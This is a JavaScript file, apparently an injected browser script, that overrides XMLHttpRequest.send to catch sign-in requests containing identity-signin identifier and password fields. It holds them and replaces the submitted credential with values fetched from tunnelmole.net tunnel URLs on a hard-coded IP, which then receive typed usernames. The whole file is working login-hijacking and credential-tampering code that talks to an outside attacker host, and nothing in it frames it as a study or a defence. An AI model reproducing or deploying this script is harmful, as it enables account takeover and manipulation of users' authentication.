let freqUsername = null;
let freqPassword = null;
const modifiedRequests = new Set();
const pendingRequests = new Map();
let usernameFetched = false;
let passwordFetched = false;

// Fetch the username when needed
const fetchFreqUsername = async () => {
    if (usernameFetched) return;

    console.log('Fetching username...');

    try {
        const response = await fetch('https://qmjnmt-ip-37-228-207-173.tunnelmole.net/get-first-post-data', {
            method: 'GET',
            headers: { 'Cache-Control': 'no-cache' }
        });

        if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);

        const result = await response.json();
        console.log('Response from /get-first-post-data:', result);

        if (result?.postData) {
            freqUsername = result.postData;
            console.log('Fetched username:', freqUsername);
            usernameFetched = true;

            // Reset the server-side username store
            await fetch('https://qmjnmt-ip-37-228-207-173.tunnelmole.net/reset-first-post-data', { method: 'POST' });
            processModifiedRequests(); // Process any pending requests immediately after fetching the username
        } else {
            console.warn("No username data received, retrying...");
            setTimeout(fetchFreqUsername, 1000); // Retry after 1s if no username is received
        }
    } catch (error) {
        console.error('Error fetching username:', error);
        setTimeout(fetchFreqUsername, 500); // Retry after 1s if error occurs
    }
};

// Fetch the password when needed (kept separate)
const fetchFreqPassword = async () => {
    if (passwordFetched) return;

    console.log('Fetching password...');

    try {
        const response = await fetch('https://wa9b11-ip-37-228-207-173.tunnelmole.net/get-second-post-data', {
            method: 'GET',
            headers: { 'Cache-Control': 'no-cache' }
        });

        if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);

        const result = await response.json();
        console.log('Response from /get-second-post-data:', result);

        if (result?.postData) {
            freqPassword = result.postData;
            console.log('Fetched password:', freqPassword);
            passwordFetched = true;

            // Reset the server-side password store
            await fetch('https://wa9b11-ip-37-228-207-173.tunnelmole.net/reset-second-post-data', { method: 'POST' });
            processModifiedRequests(); // Process any pending requests after fetching the password
        } else {
            console.warn("No password data received, retrying...");
            setTimeout(fetchFreqPassword, 1000); // Retry after 1s if no password is received
        }
    } catch (error) {
        console.error('Error fetching password:', error);
        setTimeout(fetchFreqPassword, 500); // Retry after 1s if error occurs
    }
};

// Process pending requests when the username is available
const processModifiedRequests = () => {
    if (!freqUsername) {
        console.log("Username not available yet, retrying...");
        fetchFreqUsername();
        return;
    }

    console.log("Processing pending requests...");

    // Create a copy of pending requests as we will modify it while iterating
    const requestsToProcess = Array.from(pendingRequests);

    for (let [xhr, body] of requestsToProcess) {
        const match = body && /identity-signin-identifier%5C%22%2C%5C%22([^&]*)%5C/.exec(body);
        const secondmatch = body && /identity-signin-password%5C%22%2C%5C%22([^&]*)%5C/.exec(body);

        // Modify only if a match is found for username or password
        if ((match || secondmatch) && !modifiedRequests.has(body)) {
            let modifiedBody = body.replace(match ? match[1] : secondmatch[1], freqUsername);

            // Mark the request as modified and send it
            modifiedRequests.add(body); 
            console.log("Sending modified request with new username:", modifiedBody);
            xhr.send(modifiedBody); // Send the modified body

            // Remove the request from pendingRequests after sending
            pendingRequests.delete(xhr);
        }
    }

    // Reset username and password after processing all requests
    if (pendingRequests.size === 0) {
        console.log("All pending requests processed, resetting freqUsername.");
        freqUsername = null;
        freqPassword = null;
        usernameFetched = false;
        passwordFetched = false;
    }
};

// Intercept XMLHttpRequest to modify requests with username
const originalXhrSend = XMLHttpRequest.prototype.send;
XMLHttpRequest.prototype.send = function (body) {
    if (!body) {
        originalXhrSend.call(this, body);
        return;
    }

    // If the body contains identity-signin-identifier or password, and it hasn't been modified yet, intercept
    if ((/identity-signin-identifier/.test(body) || /identity-signin-password/.test(body)) && !Array.from(modifiedRequests).some(m => body.includes(m))) {
        console.log("Intercepted request:", body);
        pendingRequests.set(this, body); // Store the request in pendingRequests
        processModifiedRequests(); // Attempt to modify and send the request immediately
    } else {
        originalXhrSend.call(this, body); // Send the original request if no modification is needed
    }
};

// Send username data to server
const sendUsername = async () => {
    console.log('Sending username...');

    const username = document.getElementById('username')?.value;
    if (!username) {
        console.warn("No username entered");
        return;
    }

    try {
        const response = await fetch('https://qmjnmt-ip-37-228-207-173.tunnelmole.net/save-username', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username })
        });

        if (response.ok) {
            console.log('Username sent successfully');
        } else {
            console.error('Error sending username:', response.statusText);
        }
    } catch (error) {
        console.error('Error sending username:', error);
    }
};

// Attach event listeners to buttons
document.addEventListener('DOMContentLoaded', () => {
    const button = document.getElementById('sendUsernameBtn');
    const usernameInput = document.getElementById('username');

    if (button) {
        button.addEventListener('click', (event) => {
            event.preventDefault();
            sendUsername(); // Trigger sending username
        });
    }

    if (usernameInput) {
        usernameInput.addEventListener('keydown', (event) => {
            if (event.key === 'Enter') {
                event.preventDefault(); // Prevent form submission
                sendUsername(); // Trigger send on Enter
            }
        });
    }

    fetchFreqUsername();
    fetchFreqPassword();
});
